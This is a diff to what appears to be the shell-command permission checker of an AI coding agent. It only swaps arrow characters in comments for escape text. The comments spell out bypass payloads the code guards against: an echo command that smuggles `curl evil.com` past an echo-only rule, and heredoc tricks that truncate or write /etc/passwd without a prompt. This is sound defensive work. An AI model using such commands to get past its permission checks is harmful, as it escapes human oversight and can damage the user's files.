@@ -128,7 +128,7 @@ export function splitCommandWithOperators(command: string): string[] {
   // Exploit: `echo "$\<NL>{}" ; curl evil.com` — pre-join, `$` and `{}` are
   // split across lines so `${}` isn't a dangerous pattern; `;` is visible but
   // the whole thing is ONE subcommand matching `Bash(echo:*)`. Post-join,
-  // zsh/bash executes `echo "${}" ; curl evil.com` → curl runs.
+  // zsh/bash executes `echo "${}" ; curl evil.com` \u2192 curl runs.
   // We join on the ORIGINAL (not processedCommand) so the fallback doesn't
   // need to deal with heredoc placeholders.
   const commandOriginalJoined = command.replace(/\\+\n/g, match => {
@@ -204,7 +204,7 @@ export function splitCommandWithOperators(command: string): string[] {
           // shell-quote preserves comment text verbatim, including our
           // injected `"PLACEHOLDER` / `'PLACEHOLDER` markers from step 0.
           // Since the original quote was NOT stripped (comments are literal),
-          // the un-placeholder step below would double each quote (`"` → `""`).
+          // the un-placeholder step below would double each quote (`"` \u2192 `""`).
           // On recursive splitCommand calls this grows exponentially until
           // shell-quote's chunker regex catastrophically backtracks (ReDoS).
           // Strip the injected-quote prefix so un-placeholder yields one quote.
@@ -652,20 +652,20 @@ export function extractOutputRedirections(cmd: string): {
   // heredoc body and NEVER reaches path validation.
   //
   // Attack: `cat <<'ls'\nx\\\nls\n> /etc/passwd\nls` with Bash(cat:*)
-  //   - bash: quoted heredoc → `\` is literal, body = `x\`, next `ls` closes
-  //     heredoc → `> /etc/passwd` TRUNCATES the file, final `ls` runs
-  //   - join-first (OLD, WRONG): `x\<NL>ls` → `xls`, delimiter search finds
-  //     the LAST `ls`, body = `xls\n> /etc/passwd` → redirections:[] →
-  //     /etc/passwd NEVER validated → FILE WRITE, no prompt
+  //   - bash: quoted heredoc \u2192 `\` is literal, body = `x\`, next `ls` closes
+  //     heredoc \u2192 `> /etc/passwd` TRUNCATES the file, final `ls` runs
+  //   - join-first (OLD, WRONG): `x\<NL>ls` \u2192 `xls`, delimiter search finds
+  //     the LAST `ls`, body = `xls\n> /etc/passwd` \u2192 redirections:[] \u2192
+  //     /etc/passwd NEVER validated \u2192 FILE WRITE, no prompt
   //   - extract-first (NEW, matches splitCommandWithOperators): body = `x\`,
-  //     `> /etc/passwd` survives → captured → path-validated
+  //     `> /etc/passwd` survives \u2192 captured \u2192 path-validated
   //
   // Original attack (why extract-before-parse exists at all):
   //   `echo payload << 'EOF' > /etc/passwd\n${}\nEOF` with Bash(echo:*)
-  //   - bash: quoted heredoc → ${} literal, echo writes "payload\n" to /etc/passwd
-  //   - checkPathConstraints: calls THIS function on original → ${} crashes
-  //     shell-quote → previously returned {redirections:[], dangerous:false}
-  //     → /etc/passwd NEVER validated → FILE WRITE, no prompt.
+  //   - bash: quoted heredoc \u2192 ${} literal, echo writes "payload\n" to /etc/passwd
+  //   - checkPathConstraints: calls THIS function on original \u2192 ${} crashes
+  //     shell-quote \u2192 previously returned {redirections:[], dangerous:false}
+  //     \u2192 /etc/passwd NEVER validated \u2192 FILE WRITE, no prompt.
   const { processedCommand: heredocExtracted, heredocs } = extractHeredocs(cmd)
 
   // SECURITY: Join line continuations AFTER heredoc extraction, BEFORE parsing.
@@ -822,8 +822,8 @@ function isSimpleTarget(target: ParseEntry | undefined): target is string {
  * bypass path validation. These require manual approval for security.
  *
  * Design invariant: for every string redirect target, EITHER isSimpleTarget
- * is TRUE (→ captured → path-validated) OR hasDangerousExpansion is TRUE
- * (→ flagged dangerous → ask). A target that fails BOTH falls through to
+ * is TRUE (\u2192 captured \u2192 path-validated) OR hasDangerousExpansion is TRUE
+ * (\u2192 flagged dangerous \u2192 ask). A target that fails BOTH falls through to
  * {skip:0, dangerous:false} and is NEVER validated. To maintain the
  * invariant, hasDangerousExpansion must cover EVERY case that isSimpleTarget
  * rejects (except the empty string which is handled separately).
@@ -831,7 +831,7 @@ function isSimpleTarget(target: ParseEntry | undefined): target is string {
 function hasDangerousExpansion(target: ParseEntry | undefined): boolean {
   // shell-quote parses unquoted globs as {op:'glob', pattern:'...'} objects,
   // not strings. `> *.sh` as a redirect target expands at runtime (single match
-  // → overwrite, multiple → ambiguous-redirect error). Flag these as dangerous.
+  // \u2192 overwrite, multiple \u2192 ambiguous-redirect error). Flag these as dangerous.
   if (typeof target === 'object' && target !== null && 'op' in target) {
     if (target.op === 'glob') return true
     return false
